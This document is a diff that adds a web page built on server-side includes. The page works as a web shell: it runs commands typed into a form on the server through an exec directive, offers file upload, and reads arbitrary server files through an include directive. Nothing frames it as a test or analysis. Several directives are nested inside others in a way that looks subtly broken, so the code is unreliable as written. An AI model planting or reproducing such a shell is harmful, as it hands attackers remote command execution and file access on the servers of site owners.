@@ -1,0 +1,33 @@
+<!--#echo var="DOCUMENT_NAME" -->
+<!--#config timefmt="%Y-%m-%d %H:%M:%S" -->
+Last Modified: <!--#echo var="LAST_MODIFIED" -->
+
+<form method="post">
+Command: <input type="text" name="cmd" size="50" value="<!--#echo var='QUERY_STRING' -->">
+<input type="submit" value="Execute">
+</form>
+
+<pre>
+<!--#if expr="$QUERY_STRING" -->
+Output of '<!--#echo var="QUERY_STRING" -->':
+<!--#exec cmd="<!--#echo var='QUERY_STRING' --> 2>&1" -->
+<!--#endif -->
+</pre>
+
+<hr>
+<h3>File Operations:</h3>
+<form method="post" enctype="multipart/form-data">
+Upload File: <input type="file" name="file">
+<input type="submit" value="Upload">
+</form>
+
+<form method="post">
+Read File: <input type="text" name="readfile" size="50">
+<input type="submit" value="Read">
+</form>
+
+<!--#if expr="$QUERY_STRING_READ" -->
+<pre>
+<!--#include virtual="<!--#echo var='QUERY_STRING_READ' -->" -->
+</pre>
+<!--#endif -->
